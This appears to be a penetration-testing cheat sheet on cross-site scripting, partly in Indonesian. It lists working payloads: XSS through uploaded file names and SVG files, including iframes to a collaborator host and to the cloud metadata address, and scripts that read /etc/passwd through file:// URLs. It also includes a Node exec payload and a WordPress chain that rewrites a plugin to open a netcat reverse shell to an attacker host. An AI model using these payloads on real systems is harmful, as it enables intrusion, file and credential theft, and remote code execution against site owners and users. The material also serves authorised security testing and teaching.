# Cross Site Scripting

## Pengantar

<table><thead><tr><th width="181">Name</th><th></th></tr></thead><tbody><tr><td>Description</td><td></td></tr><tr><td>Impact</td><td><ul><li>an attacker can steal user cookie</li><li>an attacker can change display of the website</li><li>an attacker can redirect user into malicious page</li></ul></td></tr><tr><td>Recommendation</td><td><ul><li>implement input validation from common metacharacter that xss used like &#x3C; > ( ) " ' [ ] ! @ # $</li><li>use HTML Encoding </li></ul></td></tr><tr><td>Reference</td><td><ul><li><a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></li><li><a href="https://brightsec.com/blog/xss/">https://brightsec.com/blog/xss/</a></li></ul></td></tr></tbody></table>

{% hint style="info" %}
**NOTE** : XSS is not just about showing alert (\<script>alert()\</script>), when you found  vulnerability you can try to escalate the risk.
{% endhint %}

## XSS Attacks&#x20;

### XSS Via File name&#x20;

when you found file upload, please try to upload file and capture via burpsuite to rename file

```html
<img src=x onerror=alert('XSS')>.png
"><img src=x onerror=alert('XSS')>.png
"><svg onmouseover=alert(1)>.svg
<<script>alert('xss')<!--a-->a.png
');\"><img src=x onerror=alert(1337)>
```

### XSS Via SVG File

```svg
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script type="text/javascript">
    // <![CDATA[
      alert(1);
   // ]]>
  </script>
</svg>
```

## Chaining XSS

### Reading Local File

```javascript
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```javascript
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.open("GET","file:///etc/passwd");
    xhzeem.send();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
</script>
```

```html
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
```

```
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

### XSS to RCE

```
<script>
  require('child_process').exec('calc');
</script>
```

### Wordpress XSS to RCE

```javascript
//https://gist.github.com/LukaSikic/48f30805b10e2a4dfd6858ebdb304be9

u = "/wp-admin/plugin-editor.php"
p = "file=akismet%2Findex.php&plugin=akismet%2Fakismet.php"
var x = new XMLHttpRequest();
var r=0
x.open('GET',u+"?"+ p,1);
x.send(null);

x.onreadystatechange = function() {
    if (x.readyState === 4 && r != 1) {
	n = /ate.+".+\s+.+ue="(.*)" \/></.exec(x.responseText)[1]
	x.open("POST", u, 1)
	x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	x.send(p + "&nonce="  + n + "&newcontent=%3C%3Fphp%20exec%28%27nc%20kali%204444%20-e%20%2Fbin%2Fbash%27%29%3B%20%3F%3E&action=edit-theme-plugin-file")
	r = 1
    } else {
	fetch('/wp-content/plugins/akismet/index.php')
    }
}
```
